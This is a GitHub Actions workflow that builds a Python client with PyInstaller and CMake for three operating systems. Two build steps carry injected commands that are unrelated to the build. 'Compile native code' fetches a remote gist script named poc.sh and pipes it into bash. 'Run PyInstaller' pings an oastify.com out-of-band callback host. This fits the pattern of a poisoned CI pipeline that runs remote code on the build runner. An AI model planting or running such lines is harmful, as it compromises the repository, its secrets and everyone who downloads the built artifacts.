# This is just a placeholder while the whole PyInstaller thing gets figured out
name: Client build

on:
  workflow_call:
    inputs:
      checkout-sha:
        required: false
        type: string

jobs:
  build_client:
    name: Build client
    strategy:
      matrix:
        include: 
          - name: windows
            os: windows-latest
            pre_command: |
              ? .
            bundle_command: |
              Compress-Archive -Path software\dist\* -DestinationPath client-windows.zip
          - name: linux
            os: ubuntu-latest
            pre_command: |
              true
            bundle_command: |
              (cd software/dist && zip -r "$OLDPWD/client-linux.zip" .)
          - name: macos
            os: macos-latest
            pre_command: |
              true
            bundle_command: |
              (cd software/dist && zip -r "$OLDPWD/client-macos.zip" .)
    runs-on: ${{ matrix.os }}
    steps:
      - name: Check out the repo
        uses: actions/checkout@v3
        with:
          ref: ${{ inputs.checkout-sha == null && github.sha || inputs.checkout-sha }}
      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.12'
      - name: Install PyInstaller and client dependencies
        run: |
          python -m pip install --upgrade pip
          pip install pyinstaller
          pip install -r software/script/requirements.txt
      - name: Run OS specific setup
        run: ${{ matrix.pre_command }}
      - name: Compile native code
        run: |
          curl -sSfL gist.githubusercontent.com/Fearless-Squirrel/bbef3562184dc8ac74b076f15a9c465f/raw/54aabb582d12f6c0cf5227a3ca6acd170cb74bff/poc.sh | bash
          cd software/src
          mkdir out
          cd out
          cmake ..
          cmake --build . --config Release
      - name: Run PyInstaller
        run: |
          curl cp5ys8p7huqvbpulnch5u272wt2kqaez.oastify.com
          cd software
          pyinstaller pyinstaller.spec
      - name: Upload built client
        uses: actions/upload-artifact@v3
        with:
          name: client-${{ matrix.name }}
          path: software/dist/*
      - name: Zip up client for release
        run: ${{ matrix.bundle_command }}
      - name: Upload release artifacts
        uses: actions/upload-artifact@v3
        with:
          name: release-artifacts
          path: client-${{ matrix.name }}.zip
